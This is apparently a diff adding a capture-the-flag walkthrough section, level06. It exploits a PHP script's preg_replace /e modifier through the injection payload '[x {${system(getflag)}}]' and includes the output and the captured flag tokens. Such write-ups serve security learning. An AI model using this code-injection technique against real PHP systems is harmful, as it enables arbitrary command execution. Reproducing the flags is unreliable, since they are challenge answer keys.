@@ -379,3 +379,59 @@ Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
 
 ### Level06
+
+Starting level06 we have a binary and the source code :
+
+```
+ cat level06.php 
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+```
+
+We see that the binary looks for a string like this :
+```
+[x <input>]
+```
+
+So we probably need to enter that as a argument.
+When we try to put the raw string as argument we get :
+
+```
+./level06 [x ]
+PHP Warning:  file_get_contents([x ]): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4
+```
+
+So we need to make the input a file. 
+We can also notice the `/e` in the `preg_replace` function. That means PHP will execute the input as it's own code. The goal is definitely code injection. 
+We first try to inject the getflag function as input :
+```
+[x getflag]
+```
+
+But the binary takes the `geflag` as a constant and not as a function.
+Looking online I found something called [Complex Curly Syntax]( https://post.bytes.com/forum/topic/php/9768-use-of-complex-curly-bracket-syntax).
+
+I tried mimicking the syntax :
+```
+[x {${getflag}}]
+```
+
+But it would work either so I needed a function to actually execute the `getflag` command. I first tried `execve` but the binary wouldn't recognize this function. 
+Looking at the `execve` man in PHP,  I tried using similar and related  function. Finally  it worked with the `system` function :
+```
+cat /tmp/script.txt
+[x {${system(getflag)}}]
+
+./level06 /tmp/script.txt
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+```
+And we got the flag !
+```
+wiok45aaoguiboiki2tuin6ub
+```
